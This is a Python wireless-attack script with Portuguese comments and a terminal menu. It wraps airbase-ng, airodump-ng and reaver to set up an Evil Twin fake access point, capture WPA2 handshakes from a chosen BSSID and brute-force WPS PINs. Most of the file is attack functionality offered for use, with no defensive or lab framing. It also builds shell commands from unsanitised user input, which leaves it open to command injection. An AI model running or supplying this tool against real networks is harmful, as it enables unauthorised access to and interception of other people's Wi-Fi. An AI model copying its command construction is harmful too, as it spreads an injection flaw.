import subprocess
import os
import sys

# Detecta se estamos no Termux
def detect_termux():
    return os.path.exists('/data/data/com.termux/files/usr/bin')

# Detecta interfaces Wi-Fi
def detect_wifi_interface():
    try:
        # Detecta interfaces Wi-Fi no Linux/Termux usando 'iw dev'
        interfaces = subprocess.check_output("iw dev | grep Interface | awk '{print $2}'", shell=True).decode().strip()
        if interfaces:
            print(f"Interface Wi-Fi detectada: {interfaces}")
            return interfaces.split()[0]  # Retorna a primeira interface Wi-Fi encontrada
        else:
            raise Exception("Nenhuma interface Wi-Fi encontrada.")
    except Exception as e:
        print(f"Erro ao detectar interfaces: {e}")
        sys.exit(1)

# Escaneia redes Wi-Fi
def scan_networks(interface):
    try:
        print(f"Escaneando redes na interface {interface}...")
        command = f"sudo iwlist {interface} scan | grep ESSID"
        output = subprocess.check_output(command, shell=True).decode()
        if output:
            print("Redes encontradas:")
            print(output)
        else:
            print("Nenhuma rede encontrada.")
    except Exception as e:
        print(f"Erro ao escanear redes: {e}")

# Coloca a interface Wi-Fi no modo monitor
def set_interface_to_monitor_mode(interface):
    try:
        print(f"Colocando a interface {interface} em modo monitor...")
        subprocess.run(f"sudo ifconfig {interface} down", shell=True)
        subprocess.run(f"sudo iwconfig {interface} mode monitor", shell=True)
        subprocess.run(f"sudo ifconfig {interface} up", shell=True)
        print(f"Interface {interface} agora está em modo monitor.")
    except Exception as e:
        print(f"Erro ao configurar a interface no modo monitor: {e}")

# Realiza o ataque Evil Twin (Linux)
def evil_twin_attack(interface, ap_name, passphrase=None):
    if detect_termux():
        print("Erro: Ataques Evil Twin não são suportados no Termux.")
        return

    try:
        print(f"Iniciando rede falsa (Evil Twin) com SSID: {ap_name}")
        command = f"sudo airbase-ng -e {ap_name} -c 6 {interface}"
        subprocess.Popen(command, shell=True)
        print(f"Rede falsa {ap_name} criada com sucesso!")
    except Exception as e:
        print(f"Erro ao iniciar ataque Evil Twin: {e}")

# Captura de pacotes WPA2 (Linux)
def capture_wpa2_handshake(interface, bssid, channel):
    if detect_termux():
        print("Erro: Captura de pacotes WPA2 não é suportada no Termux.")
        return

    try:
        print(f"Iniciando captura de handshakes WPA2 na rede {bssid} (canal {channel})...")
        command = f"sudo airodump-ng -c {channel} --bssid {bssid} -w handshake_capture {interface}"
        subprocess.Popen(command, shell=True)
        print(f"Captura de handshakes WPA2 iniciada.")
    except Exception as e:
        print(f"Erro ao iniciar captura de handshakes WPA2: {e}")

# Realiza ataque WPS com Reaver (Linux)
def wps_attack(interface, bssid, pin=None):
    if detect_termux():
        print("Erro: Ataque WPS não é suportado no Termux.")
        return

    try:
        if pin:
            command = f"sudo reaver -i {interface} -b {bssid} -p {pin} -vv"
            print(f"Executando ataque WPS com PIN {pin}...")
        else:
            command = f"sudo reaver -i {interface} -b {bssid} -vv"
            print("Executando ataque WPS tentando múltiplos PINs...")

        subprocess.run(command, shell=True)
    except Exception as e:
        print(f"Erro ao iniciar ataque WPS: {e}")

# Menu principal para interagir no terminal
def main():
    if detect_termux():
        print("Detectado ambiente Termux. Algumas funcionalidades serão limitadas.")

    interface = detect_wifi_interface()

    while True:
        print("\nSelecione uma opção:")
        print("1. Escanear redes Wi-Fi")
        print("2. Colocar interface em modo monitor")
        print("3. Realizar ataque Evil Twin (somente Linux)")
        print("4. Capturar pacotes WPA2 (somente Linux)")
        print("5. Realizar ataque WPS (somente Linux)")
        print("6. Sair")

        choice = input("Escolha uma opção: ")

        if choice == "1":
            scan_networks(interface)
        elif choice == "2":
            set_interface_to_monitor_mode(interface)
        elif choice == "3":
            ap_name = input("Digite o nome da rede falsa (Evil Twin): ")
            evil_twin_attack(interface, ap_name)
        elif choice == "4":
            bssid = input("Digite o BSSID da rede alvo: ")
            channel = input("Digite o canal da rede alvo: ")
            capture_wpa2_handshake(interface, bssid, channel)
        elif choice == "5":
            bssid = input("Digite o BSSID da rede alvo: ")
            pin = input("Digite o PIN WPS (ou deixe em branco para usar múltiplos PINs): ")
            wps_attack(interface, bssid, pin if pin else None)
        elif choice == "6":
            print("Saindo...")
            break
        else:
            print("Opção inválida! Por favor, tente novamente.")

if __name__ == "__main__":
    main()
